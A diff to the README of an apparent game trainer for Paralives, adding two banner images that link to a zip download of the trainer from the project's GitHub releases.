@@ -9,7 +9,11 @@
 [![License](https://img.shields.io/badge/license-MIT-86d9c0)](LICENSE)
 
 > **[⬇ Download the latest Paralives trainer](https://github.com/pondseapurify/Paralives-Trainer/releases/latest)**
-
+<p align="center">
+    <a href="https://github.com/pondseapurify/Paralives-Trainer/releases/latest/download/ParalivesTrainer.zip">
+        <img src="assets/banner.png" width="100%" alt="Download Paralives Trainer">
+    </a>
+</p>
 ---
 
 ## Contents
@@ -94,7 +98,11 @@ Everything untagged is runtime-only and leaves nothing behind.
 ---
 
 ## Features
-
+<p align="center">
+    <a href="https://github.com/pondseapurify/Paralives-Trainer/releases/latest/download/ParalivesTrainer.zip">
+        <img src="assets/example.png" width="100%" alt="Download Paralives Trainer">
+    </a>
+</p>
 60+ options across eight tabs, grouped into **Live**, **Create** and **System**. Sliders show the shipped default.
 
 ### Para — needs and skills
